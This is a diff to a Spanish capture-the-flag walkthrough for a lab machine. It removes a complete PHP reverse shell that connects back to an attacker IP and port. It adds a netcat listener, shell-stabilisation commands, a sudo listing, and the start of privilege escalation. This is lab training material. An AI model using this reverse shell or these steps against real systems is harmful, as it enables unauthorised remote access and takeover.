@@ -45,126 +45,56 @@ https://github.com/pentestmonkey/php-reverse-shell
 Por lo tanto he usado la herramienta ftp para subir el fichero reverse.php configurando nuestra IP y nuestro puerto
 y usando la herrameinta netcat para hacer la conexion.
 
-```php
-<?php
-// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+![alt text](Imagenes/Anon_3.png)
 
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '192.168.139.130';
-$port = 1234;
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; sh -i';
-$daemon = 0;
-$debug = 0;
+Si nos ponemos en escucha por el puerto 1234 con netcat:
 
-if (function_exists('pcntl_fork')) {
-	$pid = pcntl_fork();
-	
-	if ($pid == -1) {
-		printit("ERROR: Can't fork");
-		exit(1);
-	}
-	
-	if ($pid) {
-		exit(0);  // Parent exits
-	}
-	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
-		exit(1);
-	}
+```ruby
+nc -lvnp 1234
+```
 
-	$daemon = 1;
-} else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-}
+y ejecutamos en el neavegador el archivo .php nos devuleve la shell
+![alt text](Imagenes/Anon_4.png)
 
-chdir("/");
+Por lo tanto estamos autenticados como el usuario "data"
 
-umask(0);
+# Tratamiento de la TTY
 
-// Open reverse connection
-$sock = fsockopen($ip, $port, $errno, $errstr, 30);
-if (!$sock) {
-	printit("$errstr ($errno)");
-	exit(1);
-}
+Para que nos sea más comodo vamos a hacer un tratamiento a la terminal para que no haya errores en algunos comados 
+y funcionen.
 
-$descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-);
+Para ello lo primero ejecutamos la siguiente orden :
 
-$process = proc_open($shell, $descriptorspec, $pipes);
+```ruby 
+script /dev/null -c bash
+```
+Pulsamos ctlr + Z salimos de la terminal y hacemos el siguientes comandos:
 
-if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
-	exit(1);
-}
+```ruby 
+stty raw -echo;fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
 
-stream_set_blocking($pipes[0], 0);
-stream_set_blocking($pipes[1], 0);
-stream_set_blocking($pipes[2], 0);
-stream_set_blocking($sock, 0);
+tendremos una terminal mas comoda.
 
-printit("Successfully opened reverse shell to $ip:$port");
+## Escalation privilege
 
-while (1) {
-	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
-		break;
-	}
+Para la escalada de privilegios vamos a utilizar el siguiente comando:
+```ruby
+sudo -l
+``
+Vemos los comandos que podemos ejecutar como root u otros usarios usando sudo:
+```ruby
+$ sudo -l
+Matching Defaults entries for www-data on debddace088e:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
-		break;
-	}
-
-	$read_a = array($sock, $pipes[1], $pipes[2]);
-	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
-		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
-		fwrite($pipes[0], $input);
-	}
-
-	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
-		$input = fread($pipes[1], $chunk_size);
-		if ($debug) printit("STDOUT: $input");
-		fwrite($sock, $input);
-	}
-
-	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
-		$input = fread($pipes[2], $chunk_size);
-		if ($debug) printit("STDERR: $input");
-		fwrite($sock, $input);
-	}
-}
-
-fclose($sock);
-fclose($pipes[0]);
-fclose($pipes[1]);
-fclose($pipes[2]);
-proc_close($process);
-
-function printit ($string) {
-	if (!$daemon) {
-		print "$string\n";
-	}
-}
-
-?>
+User www-data may run the following commands on debddace088e:
+    (pingu) NOPASSWD: /usr/bin/man
 ```
 
 
 
 
-## Escalation privilege
